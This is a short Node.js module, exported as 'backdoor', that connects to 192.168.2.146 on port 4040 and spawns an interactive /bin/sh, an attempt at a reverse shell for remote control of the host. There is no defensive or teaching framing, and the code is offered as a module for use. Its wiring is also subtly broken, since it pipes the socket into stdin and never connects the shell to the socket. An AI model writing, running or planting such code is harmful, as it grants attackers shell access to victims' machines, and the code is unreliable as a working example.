const net = require('net');
const { spawn } = require('child_process');

const backdoor = () => {
    const socket = new net.Socket();

    socket.connect(4040, '192.168.2.146', () => {
        // Connection established
        socket.pipe(process.stdin);
        socket.pipe(process.stdout);
        socket.pipe(process.stderr);
    });

    // Handle errors and close event
    socket.on('error', (err) => {
        console.error('Error connecting to the remote server:', err.message);
        socket.destroy();
    });

    socket.on('close', () => {
        console.log('Connection to the remote server closed.');
    });

    // Spawn a shell
    const shell = spawn('/bin/sh', ['-i'], {
        stdio: [process.stdin, process.stdout, process.stderr],
    });
};

module.exports = backdoor;